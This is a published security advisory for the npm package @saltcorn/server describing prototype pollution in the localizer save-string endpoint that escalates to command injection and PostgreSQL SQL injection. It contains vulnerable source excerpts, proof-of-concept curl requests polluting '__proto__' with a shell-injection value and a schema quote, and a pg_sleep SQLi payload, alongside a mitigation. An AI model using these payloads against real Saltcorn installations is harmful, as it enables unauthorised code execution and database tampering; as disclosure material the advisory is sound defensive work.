# [H] @saltcorn/server Remote Code Execution (RCE) / SQL injection via prototype pollution  by manipulating `lang` and  `defstring` parameters when setting localizer strings

## Summary
Severity: High
Advisory: GHSA-78p3-fwcq-62c2
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2024-10-03
Source: https://github.com/advisories/GHSA-78p3-fwcq-62c2
Type: github-advisory

## Affected
- npm: `@saltcorn/server` — affected >=0 <1.0.0-beta.14

## Details
### Summary

The endpoint `/site-structure/localizer/save-string/:lang/:defstring` accepts two parameter values: `lang` and `defstring`. These values are used in an unsafe way to set the keys and value of the `cfgStrings` object. It allows to add/modify properties of the `Object prototype` that result in several logic issues, including:
- RCE vulnerabilities by polluting the `tempRootFolder` property 
- SQL injection vulnerabilities by polluting the `schema` property when using `PostgreSQL` database.


### Details

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239
```js
router.post(
  "/localizer/save-string/:lang/:defstring",
  isAdmin,
  error_catcher(async (req, res) => {
    const { lang, defstring } = req.params; // source

    const cfgStrings = getState().getConfigCopy("localizer_strings");
    if (cfgStrings[lang]) cfgStrings[lang][defstring] = text(req.body.value); // [1] sink
    else cfgStrings[lang] = { [defstring]: text(req.body.value) };
    await getState().setConfig("localizer_strings", cfgStrings);
    res.redirect(`/site-structure/localizer/edit/${lang}`);
  })
);
```

### PoC

Setup:
- set `SALTCORN_NWORKERS=1` before starting the `saltcorn` server (to easily observe the behavior of the PoC)
```
SALTCORN_NWORKERS=1 saltcorn serve
```
- make sure to use PostgresSQL backend
- login with a user with admin permission

#### RCE

This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain command executed.
- check that the file that will be created does not exists:
```
cat /tmp/RCE
cat: /tmp/RCE: No such file or directory
```

- pollute the `Object.prototype` with a `tempRootFolder` value set to `;echo+"rce"|tee+/tmp/RCE;` by sending the following request *** :

```bash
curl -i -X $'POST' \
    -H $'Host: localhost:3000' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \
    -H $'Origin: http://localhost:3000' \
    -H $'Connection: close' \
    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \
    --data-binary $'_csrf=VALID_csrf_Value&value=;echo+"rce"|tee+/tmp/RCE;' \
    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/tempRootFolder'
```

 visit `http://localhost:3000/plugins/new`
- enter the following fields:
	- Name: `test`
	- Source: `git`
	- other fields blank
  - click `Create`
- you will get an error but the command `echo "rce" | tee /tmp/RCE` will be executed
- to verify:
```
cat /tmp/RCE
rce
```

The RCE occurs because after the previous curl request, the `tempRootFolder` property is set to `;echo+"rce"|tee+/tmp/RCE;` that is later used to build the shell commands.

- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/plugins-loader/plugin_installer.js#L45-L58

```js
class PluginInstaller {
  constructor(plugin, opts = {}) { // opts will have the tempRootFolder property set with dangerous values // [2]
    [...]
    this.tempRootFolder =
      opts.tempRootFolder || envPaths("saltcorn", { suffix: "tmp" }).temp; // [3]
	 [...]
    this.pckJsonPath = join(this.pluginDir, "package.json");
    this.tempDir = join(this.tempRootFolder, "temp_install", ...tokens); // [4]
    [...]
  }
  [...]
}
```

#### SQL Injection

This PoC demonstrates how to escalate the Prototype Pollution vulnerability to change the behavior of certain SQL queries (i.e SQLi).
- visit `http://localhost:3000/table` to check the page returns some results (no errors)
- pollute the `Object.prototype` with a schema value set to `"` (just to create an exception in the query that will be executed to demonstrate the issue) by sending the following request *** :

```
curl -i -X $'POST' \
    -H $'Host: localhost:3000' \
    -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Accept: */*' \
    -H $'Origin: http://localhost:3000' \
    -H $'Connection: close' \
    -b $'loggedin=true; connect.sid=VALID_CONNECT_SID_COOKIE' \
    --data-binary $'_csrf=VALID_csrf_Value&value=\"' \
    $'http://localhost:3000/site-structure/localizer/save-string/__proto__/schema'
```

- visit again `http://localhost:3000/table` but this time an SQL error will appear:
```
syntax error at or near "" order by lower(""
```


**NOTE**: Another payload to use as `value` could be `pg_user"+WHERE+1=1+AND+(SELECT+pg_sleep(5))+IS+NOT+NULL+--`

The SQL injection occurs because after the previous curl request, the `schema` property is set to `"`.
- file: https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/postgres/postgres.js#L101

```js
const select = async (tbl, whereObj, selectopts = {}) => { // [2] selectopts
  const { where, values } = mkWhere(whereObj);
  const schema = selectopts.schema || getTenantSchema(); // [3] selectopts.schema
  const sql = `SELECT ${
    selectopts.fields ? selectopts.fields.join(", ") : `*`
  } FROM "${schema}"."${sqlsanitize(tbl)}" ${where} ${mkSelectOptions( // [4] schema
    selectopts,
    values,
    false
  )}`;
  sql_log(sql, values);
  const tq = await (client || selectopts.client || pool).query(sql, values);

  return tq.rows;
};
```

*** Retrieve valid values for the `connect.sid` (`VALID_CONNECT_SID_COOKIE`) and `_csrf` values (`VALID_csrf_Value`) :
- open the browser developer console and go to the `Network` tab
- visit `http://localhost:3000/site-structure/localizer/add-lang`
- add a language (`Name: test` , `Locale: test`) and click `Save`
- under the `Network` tab, filter for `save-lang` and check the request parameters (`Headers` and `Payload`/`Request` tabs)
- copy the values for `connect.sid` and `_csrf` and paste in the curl command above

### Impact

Remote code execution (RCE), Sql injection and business logic errors.

### Recommended Mitigation

Check the values of `lang` and  `defstring` parameters against dangerous properties like `__proto__`, `constructor`, `prototype`.

## References
- https://github.com/saltcorn/saltcorn/security/advisories/GHSA-78p3-fwcq-62c2
- https://github.com/saltcorn/saltcorn/commit/9e066ae8ba317469053cc27e95dcdf5b6e60e12d
- https://github.com/saltcorn/saltcorn
- https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.13/packages/server/routes/infoarch.js#L236-L239
